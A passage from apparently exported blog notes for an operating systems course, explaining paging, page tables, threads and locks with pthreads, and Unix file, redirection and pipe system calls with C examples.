<li>Easy to allocate and keep a free list</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Address-Transition-1"><a href="#Address-Transition-1" class="headerlink" title="Address Transition"></a>Address Transition</h3><img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iuj0y0taj31cs0u0afq.jpg" width="500px">

<ul>
<li><p>Two components in the virtual address</p>
<ol>
<li><font color="3A75EA">VPN</font>: virtual page number</li>
<li><font color="3A75EA">Offset</font>: offset within the page  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iumjzfwtj31uo090t9b.jpg" width="500px">
 
<ul>
<li>For a 64-byte address space with 16 bytes page.</li>
<li>We have $4 &#x3D; 2^2$ pages and and page size $16 &#x3D; 2^4$.</li>
<li>Therefore, we can use 6 bits to represent the address, where the first 2 bits are VPN, the rest are the offset.</li>
</ul>
</li>
</ol>
</li>
<li><p>Example:</p>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iumivlahj31sz0u0wgt.jpg" width="500px"></li>
</ul>
<h3 id="Page-Table"><a href="#Page-Table" class="headerlink" title="Page Table"></a>Page Table</h3><ul>
<li><p>The page table is just a data structure (array) that is used to map the virtual address to physical address.</p>
</li>
<li><p>The OS indexes the array by VPN and looks up the page-table entry.</p>
</li>
<li><p>Page Table Storage:</p>
<ul>
<li>Page tables can get very large:<ul>
<li>32-bit address ($2^{32} &#x3D; 4$GB) space with 4-KB pages and 20bits for VPN<br>  ($4$MB &#x3D; $2^{20}$ entries * $2^2$ bytes per table entry)</li>
</ul>
</li>
</ul>
</li>
<li><p>Common Flags of Page Table Entry</p>
<ol>
<li><font color="3A75EA">Valid Bit</font>: Indicating whether the particular transition is valid.</li>
<li><font color="3A75EA">Protection Bit</font>: Indicating whether the page could be read from, written to, or execute from.</li>
<li><font color="3A75EA">Present Bit</font>: Indicating whether this page is in physical memory or on disk.</li>
<li><font color="3A75EA">Dirty Bit</font>: Indicating whether the page has been modified since it was brought into memory.</li>
<li><font color="3A75EA">Reference Bit (Accessed Bit)</font>: Indicating that a page has been accessed.  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ivefbutkj31uo0aoabq.jpg" width="500px">
 
<ul>
<li><code>P</code>: present bit</li>
<li><code>R/W</code>: read &#x2F; write bit</li>
<li><code>U/S</code>: supervisor</li>
<li><code>A</code>: accessed bit</li>
<li><code>D</code>: dirty bit</li>
<li><code>PFN</code>: the page frame number</li>
</ul>
</li>
</ol>
</li>
<li><p>Access memory with paging</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Extract the VPN from the virtual address</span></span><br><span class="line">VPN = (VirtualAddress &amp; VPN_MASK) &gt;&gt; SHIFT</span><br><span class="line"></span><br><span class="line"><span class="comment">// Form the address of the page-table entry (PTE)</span></span><br><span class="line">PTEAddr = PTBR + (VPN * <span class="keyword">sizeof</span>(PTE))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch the PTE</span></span><br><span class="line">PTE = AccessMemory(PTEAddr)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if process can access the page</span></span><br><span class="line"><span class="keyword">if</span> (PTE.Valid == False) &#123;</span><br><span class="line">    RaiseException(SEGMENTATION_FAULT)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CanAccess(PTE.ProtectBits) == False) &#123;</span><br><span class="line">    RaiseException(PROTECTION_FAULT)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Access is OK: form physical address and fetch it</span></span><br><span class="line">    offset = VirtualAddress &amp; OFFSET_MASK</span><br><span class="line">    PhysAddr = (PTE.PFN &lt;&lt; PFN_SHIFT) | offset</span><br><span class="line">    Register = AccessMemory(PhysAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><strong>Disadvantage</strong>: Paging is too slow</p>
<ul>
<li>To find a location of the target PTE, the starting location of the page table is needed.</li>
<li>For every memory reference, paging requires the OS to perform one extra memory reference.</li>
</ul>
</li>
</ul>
<h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>Paging divides the virtual address and physical memory into pages with same page size.</li>
<li>Use the page table to store the mapping PFN for each process.<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iw72ecnbj31170u07aq.jpg" width="500px"></li>
</ul>
<!-- <img src="" width="500px">
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font> -->]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Concurrency (Thread)</title>
    <url>/myBlog/2022/12/07/2022/CSCI3150/2022-12-7-CSCI3150-Concurrency-Thread/</url>
    <content><![CDATA[<h2 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h2><ul>
<li><p>A new abstraction for a single running process.</p>
</li>
<li><p>Switch between threads</p>
<ul>
<li><p>Each thread has it own <font color="3A75EA">program counter</font> and <font color="3A75EA">set of registers</font></p>
<ul>
<li>so, each thread has its own stack.</li>
</ul>
</li>
<li><p>When switching from running thread (T1) to other (T2)</p>
<ol>
<li>Save the register state of T1</li>
<li>Restore the register state of T2</li>
</ol>
<ul>
<li>The address space remains the same</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Concurrency-Problem"><a href="#Concurrency-Problem" class="headerlink" title="Concurrency Problem"></a>Concurrency Problem</h3><ul>
<li><p>Problem Example:</p>
<ul>
<li>Thread: <ul>
<li>A function runs within the same memory space.</li>
<li>Each thread starts running in a routine call <code>worker()</code> (real program).</li>
</ul>
</li>
</ul>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> loops;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">worker</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">        counter++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: threads &lt;value&gt;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loops = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">pthread_t</span> p1, p2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initial value : %d\n&quot;</span>, counter);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;p1, <span class="literal">NULL</span>, worker, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;p2, <span class="literal">NULL</span>, worker, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(p1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(p2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final value : %d\n&quot;</span>, counter);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>./x 100</code></p>
<ul>
<li>Initial value : 0</li>
<li>Final value : 200</li>
</ul>
</li>
<li><p><code>./x 10000000</code></p>
<ul>
<li>Initial value : 0</li>
<li>Final value : 10096682</li>
</ul>
</li>
<li><p>Since when we do increment, it takes 3 instructions:</p>
<ol>
<li>Load the value of counter from the memory to the register</li>
<li>Increment it</li>
<li>Store it back to the memory</li>
</ol>
<ul>
<li>But these 3 instructions do not execute atomically, so the problem of concurrency happened.</li>
</ul>
</li>
</ul>
</li>
<li><p>Solution:</p>
<ul>
<li><p>Critical Section</p>
<ul>
<li>A piece of code that <font color="3A75EA">accesses a shared variable</font>, must not be concurrently executed by more than one thread.<ul>
<li>So, multiple threads which execute the critical section should result in a race condition</li>
<li>Need to support atomicity for critical sections</li>
</ul>
</li>
</ul>
</li>
<li><p>Lock</p>
<ul>
<li>To ensure that the critical section can execute only if it was a single automic instruction  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">lock_t</span> mutex;</span><br><span class="line">...</span><br><span class="line">lock(&amp;mutex);</span><br><span class="line"><span class="comment">/* Critical Section */</span></span><br><span class="line">balance = balance + <span class="number">1</span></span><br><span class="line">unlock(&amp;mutex);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Thread-API"><a href="#Thread-API" class="headerlink" title="Thread API"></a>Thread API</h2><h3 id="Thread-Creation"><a href="#Thread-Creation" class="headerlink" title="Thread Creation"></a>Thread Creation</h3><ul>
<li><p>Used to create a thread</p>
</li>
<li><p>Syntax: </p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">pthread_t</span>* thread,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">pthread_attr_t</span>* attr,</span></span><br><span class="line"><span class="params">    <span class="type">void</span>* (*start_routine)(<span class="type">void</span>*),</span></span><br><span class="line"><span class="params">    <span class="type">void</span>* arg</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>thread</code>: interact with this thread (id)</li>
<li><code>attr</code>: to specify any attributes this thread might have</li>
<li><code>start_routine</code>: the function this thread start running in</li>
<li><code>arg</code>: the argument to be passed to the function</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myarg_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125; <span class="type">myarg_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mythread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">myarg_t</span> *m = (<span class="type">myarg_t</span> *) arg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, m-&gt;a, m-&gt;b);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> p;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">myarg_t</span> args;</span><br><span class="line">    args.a = <span class="number">10</span>;</span><br><span class="line">    args.b = <span class="number">20</span>;</span><br><span class="line">    rc = pthread_create(&amp;p, <span class="literal">NULL</span>, mythread, &amp;args);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Thread-Wait"><a href="#Thread-Wait" class="headerlink" title="Thread Wait"></a>Thread Wait</h3><ul>
<li><p>Used to wait for a thread to complete</p>
</li>
<li><p>Syntax: <code>int pthread_join(pthread_t thread, void **value_ptr);</code></p>
<ul>
<li><code>thread</code>: the thread that wait for</li>
<li><code>value_ptr</code>: a pointer to the return value</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myarg_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125; <span class="type">myarg_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myret_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125; <span class="type">myret_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mythread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">myarg_t</span> *m = (<span class="type">myarg_t</span> *) arg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, m-&gt;a, m-&gt;b);</span><br><span class="line">    <span class="type">myret_t</span> *r = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">myret_t</span>));</span><br><span class="line">    r-&gt;x = <span class="number">1</span>;</span><br><span class="line">    r-&gt;y = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *) r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">pthread_t</span> p;</span><br><span class="line">    <span class="type">myret_t</span> *m;</span><br><span class="line">    </span><br><span class="line">    <span class="type">myarg_t</span> args;</span><br><span class="line">    args.a = <span class="number">10</span>;</span><br><span class="line">    args.b = <span class="number">20</span>;</span><br><span class="line">    pthread_create(&amp;p, <span class="literal">NULL</span>, mythread, &amp;args);</span><br><span class="line">    pthread_join(p, (<span class="type">void</span> **) &amp;m);  <span class="comment">// this thread has been	</span></span><br><span class="line">                                    <span class="comment">// waiting inside of the 			</span></span><br><span class="line">                    <span class="comment">// pthread_join() routine.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;returned %d %d\n&quot;</span>, m-&gt;x, m-&gt;y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><ul>
<li><p>Provide <font color="3A75EA">mutual exclusion</font> to a cirtical section</p>
</li>
<li><p>Interface:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_unlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Usage:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> lock;</span><br><span class="line">pthread_mutex_lock(&amp;lock);</span><br><span class="line"><span class="comment">/* Critical Section ... */</span></span><br><span class="line">pthread_mutex_unlock(&amp;lock);</span><br></pre></td></tr></table></figure>
<ul>
<li>If there is no other thread holds the lock, then the thread will acquire the lock and <font color="F54747">enter the critical section</font>.</li>
<li>If another thread holds the lock, then the thread will <font color="F54747">not return from the call until it has acquired the lock</font>.</li>
</ul>
</li>
<li><p>Check Errors:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// First way</span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Second way</span></span><br><span class="line"><span class="type">int</span> rc = pthread_mutex_init(&amp;lock, <span class="literal">NULL</span>);</span><br><span class="line">assert(rc == <span class="number">0</span>);    <span class="comment">// always check success!</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span> &#123;</span><br><span class="line">    <span class="type">int</span> rc = pthread_mutex_lock(mutex);</span><br><span class="line">    assert(rc == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Lock Acquistion</p>
<ol>
<li><p>Return failure if the lock is already held</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_trylock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Return after a timeout or after acquiring the lock</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timelock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex, <span class="keyword">struct</span> timespec *abs_timeout)</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>System Call (File &amp; Directory)</title>
    <url>/myBlog/2022/09/20/2022/CSCI3150/2022-9-20-CSCI3150-SystemCall-F&amp;D/</url>
    <content><![CDATA[<h2 id="File-amp-Directory"><a href="#File-amp-Directory" class="headerlink" title="File &amp; Directory"></a>File &amp; Directory</h2><ol>
<li><p>File</p>
<ul>
<li>A container to contain data of a file (provides a linear space so that stores the data linearly).</li>
<li>Each file has a low-level name (<font color="f54747">inode number</font>).</li>
</ul>
</li>
<li><p>Directory</p>
<ul>
<li>An implement directory tree (directory hierarchy).</li>
<li>It also has a low level name.</li>
<li>It contains a list of file name and inode number pair.</li>
</ul>
</li>
</ol>
<h2 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h2><h3 id="open-System-Call"><a href="#open-System-Call" class="headerlink" title="open System Call"></a><code>open</code> System Call</h3><ul>
<li><p>Syntax: <code>int open(const char *pathname, int oflags);</code></p>
<ul>
<li><code>O_RDONLY</code>: Read only</li>
<li><code>O_WRONLY</code>: Write only</li>
<li><code>O_RDWR</code>: Read and write.</li>
<li><code>O_CREAT</code>: If the pathname does not exist, create it as a regular file.</li>
<li><code>O_TRUNC</code>: If the file already exists and is a regular file and the access mode allows writing, it will be truncated to length 0.</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li><font color="f54747">file descriptor</font> which is an integer to access files.</li>
</ul>
</li>
</ul>
<h3 id="open-Process"><a href="#open-Process" class="headerlink" title="open Process"></a><code>open</code> Process</h3><ul>
<li><p>After executing <code>open</code> system call, it undergoes:</p>
<ol>
<li>The file descriptor specifies the index into File Descriptor Table (FDT) of the process.</li>
<li>The entries of FDT contain pointers to entries in the System File Table (SFT).</li>
<li>When a file is opened, an entry is created in both FDT and SFT.</li>
<li>SFT entry contains information about whether a file is open for read, write, protection, or lock and the file offset.</li>
</ol>
  <img src="https://p.ipic.vip/h8cq11.png" width="400px">
  </li>
<li><p>The file descriptor for the created file is <code>3</code>.</p>
</li>
<li><p>Because when a process is created, file descriptor <code>0</code>, <code>1</code>, <code>2</code> are opened by the default for standard input, output and error.</p>
</li>
</ul>
<h3 id="read-System-Call"><a href="#read-System-Call" class="headerlink" title="read System Call"></a><code>read</code> System Call</h3><ul>
<li><p>Syntax: <code>ssize_t read(int fd, void *buf, size_t count);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>buf</code>: buffer pointer</li>
<li><code>count</code>: the number of bytes to write to</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>the number of bytes it read.</li>
</ul>
</li>
</ul>
<h3 id="write-System-Call"><a href="#write-System-Call" class="headerlink" title="write System Call"></a><code>write</code> System Call</h3><ul>
<li><p>Syntax: <code>ssize_t write(int fd, const *buf, size_t count);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>buf</code>: buffer pointer</li>
<li><code>count</code>: the number of bytes to write to</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>the number of bytes it write.</li>
</ul>
</li>
</ul>
<h3 id="lseek-System-Call"><a href="#lseek-System-Call" class="headerlink" title="lseek System Call"></a><code>lseek</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>An open file has a <font color="f54747">current offset</font> to determine where the next read or write will begin reading from or writing to within the file.</li>
<li><code>lseek</code> is used to update the current offset explicitly.</li>
</ul>
</li>
<li><p>Syntax: <code>off_t lseek(int fd, off_t offset, int whence);</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
<li><code>offset</code>: position the file offset to particular location within the file</li>
<li><code>whence</code>: determine how the seek is performed<ul>
<li><code>SEEK_SET</code>: the offset is set to offset bytes (offset)</li>
<li><code>SEEK_CUR</code>: the offset is set to offset bytes + its current location (offset + current)</li>
<li><code>SEEK_END</code>: the offset is set to offset bytes + the size of the file (offset + the end)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><ol>
<li>File Operations: <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">20</span>] = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="type">char</span> rbuf1[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// open or create &quot;myfile&quot;</span></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;myfile&quot;</span>, O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR );</span><br><span class="line"></span><br><span class="line">write(fd, buf, <span class="number">20</span>);         <span class="comment">// write buf into fd</span></span><br><span class="line">lseek(fd, <span class="number">0</span>, SEEK_SET);     <span class="comment">// update the offset to the start</span></span><br><span class="line">read(fd, rbuf1, <span class="number">20</span>);        <span class="comment">// read the content in fd (buf) and store into rbuf1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, rbuf1);      <span class="comment">// Hello World!</span></span><br><span class="line"></span><br><span class="line">lseek(fd, <span class="number">6</span>, SEEK_SET);     <span class="comment">// update the offset to the start + 6</span></span><br><span class="line">read(fd, rbuf2, <span class="number">20</span>);        <span class="comment">// read the content and store into rbuf2</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, rbuf2);      <span class="comment">// World!</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="I-x2F-O-Redirection"><a href="#I-x2F-O-Redirection" class="headerlink" title="I&#x2F;O Redirection"></a>I&#x2F;O Redirection</h2><h3 id="Redirection"><a href="#Redirection" class="headerlink" title="Redirection"></a>Redirection</h3><ol>
<li><p>Redirection</p>
<ul>
<li>it means that the process modifies its File Descriptor Table (FDT) entry so that it points to a different entry in the System File Table (SFT).</li>
</ul>
</li>
<li><p>Example</p>
<ul>
<li>The command <code>cat</code> reads from a file and echoes to <font color="f54747">standard output</font></li>
<li>Suppose the <code>myfile</code> contains “Hello World” content, <code>ls -l &gt; myfile</code> command redirects standard output to <code>myfile</code>:  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># output: Hello World</span></span><br><span class="line"><span class="built_in">ls</span> -l &gt; myfile</span><br><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># execute ls -l</span></span><br></pre></td></tr></table></figure></li>
<li>Coding  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 6-2-redirection-exec */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="type">char</span> *cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">5</span>];</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = <span class="string">&quot;myfile&quot;</span>;</span><br><span class="line">    argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    execvp(cmd, argv);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="dup-System-Call"><a href="#dup-System-Call" class="headerlink" title="dup System Call"></a><code>dup</code> System Call</h3><ul>
<li><p>Description:<br>  <code>dup</code> is a smart function that can duplicate (copy) the file descriptor <code>fd</code> to the lowest-numbered unused file descriptor in the File Descriptor Table (FDT).</p>
</li>
<li><p>Syntax: <code>int dup(int fd)</code></p>
<ul>
<li><code>fd</code>: file descriptor</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success, return a new file descriptor</li>
<li>Error, return <code>-1</code></li>
</ul>
</li>
<li><p>Example:</p>
<ul>
<li>Redirects standard output  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 6-redirection */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *cmd;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;myfile&quot;</span>, O_CREAT |O_TRUNC |O_RDWR, S_IRUSR| S_IWUSR );</span><br><span class="line">    close(<span class="number">1</span>);		<span class="comment">// Close the stdout</span></span><br><span class="line">    dup(fd);		<span class="comment">// Duplicate fd</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;    </span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;     </span><br><span class="line">    argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execvp(cmd, argv); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> myfile      <span class="comment"># execute ls -l</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Processes-Communication"><a href="#Processes-Communication" class="headerlink" title="Processes Communication"></a>Processes Communication</h2><h3 id="pipe-System-Call"><a href="#pipe-System-Call" class="headerlink" title="pipe System Call"></a><code>pipe</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>Pipes provide a <font color="f54747">unidirectional</font> interprocess communication channel.</li>
<li>A pipe has a <font color="7B3279">read end</font> and a <font color="7B3279">write end</font>.<ul>
<li>Data is written to the write end of a pipe can be read from the read end of the pipe.</li>
<li>If a process attempts to read from an <font color="7B3279">empty pipe</font>, then <code>read()</code> will block until the data is available.</li>
</ul>
</li>
</ul>
</li>
<li><p>Situations:</p>
<ul>
<li>If all file descriptors referring to the <font color="f54747">write end of a pipe have been closed</font>, then an attempt to <code>read()</code> from the pipe will see end-of-file.</li>
<li>If all file descriptors referring to the <font color="f54747">read end of a pipe have been closed</font>, then a <code>write()</code> will cause a SIGPIPE signal to be generated for all the calling process.<ul>
